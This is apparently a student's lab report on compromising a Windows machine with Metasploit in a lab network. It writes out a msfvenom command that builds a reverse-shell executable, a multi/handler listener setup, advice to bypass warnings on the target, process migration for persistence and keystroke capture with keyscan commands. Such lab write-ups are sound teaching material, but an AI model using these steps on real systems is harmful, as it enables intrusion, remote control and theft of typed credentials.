# NAME: SHIVARAM M.
# REG.NO.: 212223040195
# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address  using ipconfig

## EXECUTION STEPS AND ITS OUTPUT:

## OUTPUT:

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/efbe8ddd-4689-4d76-8a0a-738813f87713)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/7e25c6a9-0a12-464a-9bba-1377556db5f5)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/6eb48d14-37a5-458a-8993-02cc0c2bee5d)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/af2f4291-daa8-4f6f-88d9-53587fb82e05)

Check the status of apache2

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/fa9a0329-af4e-42c1-85c7-a4daaa004245)

Invoke msfconsole:

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/8beddc00-f3be-4098-839f-03e541c9d987)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/d5d09a32-52fb-4ef0-bb24-2595742df279)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/66ed076f-20d7-4310-8780-5124ba781c3f)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/1278b5ba-0acd-467f-a500-ec200e55d142)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/b74af423-9e83-4ca1-bd99-fcec6607648a)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Shivaram2525/Compromising-windows-using-Metasploit/assets/144226303/b15651b5-8d66-4e7d-95fe-8f12f6afc1d3)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
